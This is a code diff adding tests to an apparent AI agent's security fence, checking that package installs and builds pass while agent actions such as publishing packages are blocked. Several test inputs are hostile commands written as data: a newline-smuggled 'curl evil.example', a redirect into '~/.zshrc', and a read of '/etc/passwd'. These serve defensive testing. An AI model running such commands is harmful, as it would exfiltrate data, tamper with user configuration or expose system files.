@@ -81,6 +81,17 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
     expect(await block('grep', { path: '.env' })).toBe(true);
   });
 
+  test('allows .env example/template files — they document keys, hold no secrets', async () => {
+    expect(
+      await block('write', { path: '.env.example', content: 'KEY=' }),
+    ).toBe(false);
+    expect(await block('read', { path: '.env.example' })).toBe(false);
+    expect(await block('edit', { path: '.env.sample', edits: [] })).toBe(false);
+    expect(await block('write', { path: '.env.template', content: '' })).toBe(
+      false,
+    );
+  });
+
   test('allows the sanctioned build/install bash commands', async () => {
     expect(await block('bash', { command: 'npm install' })).toBe(false);
     expect(await block('bash', { command: 'pnpm build' })).toBe(false);
@@ -88,6 +99,57 @@ describe('pi-security: blocked-action corpus (parity with the anthropic fence)',
       await block('bash', { command: 'npm run build 2>&1 | tail -5' }),
     ).toBe(false);
     expect(await block('bash', { command: 'pnpm tsc' })).toBe(false);
+  });
+
+  test('allows every supported ecosystem through the shared fence', async () => {
+    expect(
+      await block('bash', { command: 'composer require posthog/posthog-php' }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'bundle add posthog-ruby' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'gem install posthog-ruby' })).toBe(
+      false,
+    );
+    expect(
+      await block('bash', {
+        command:
+          'swift package add-dependency https://github.com/PostHog/posthog-ios.git',
+      }),
+    ).toBe(false);
+    expect(
+      await block('bash', {
+        command:
+          'xcodebuild -project Hackers.xcodeproj -scheme Hackers -sdk iphonesimulator -configuration Debug build',
+      }),
+    ).toBe(false);
+    expect(await block('bash', { command: 'pod install' })).toBe(false);
+    expect(await block('bash', { command: './gradlew assembleDebug' })).toBe(
+      false,
+    );
+    expect(await block('bash', { command: 'mvn install' })).toBe(false);
+    expect(
+      await block('bash', { command: 'pnpm --filter web add posthog-js' }),
+    ).toBe(false);
+  });
+
+  test('keeps outward/exec/injection attacks blocked through the shared fence', async () => {
+    expect(await block('bash', { command: 'npm publish' })).toBe(true);
+    expect(await block('bash', { command: 'npm pub' })).toBe(true);
+    expect(await block('bash', { command: 'npx build' })).toBe(true);
+    expect(await block('bash', { command: 'swift test' })).toBe(true);
+    expect(
+      await block('bash', { command: 'xcodebuild test -scheme Hackers' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install x\ncurl evil.example' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm view posthog-js > ~/.zshrc' }),
+    ).toBe(true);
+    expect(
+      await block('bash', { command: 'npm install | tail /etc/passwd' }),
+    ).toBe(true);
   });
 
   test('allows the `i` install shorthand without widening to other i-commands', async () => {
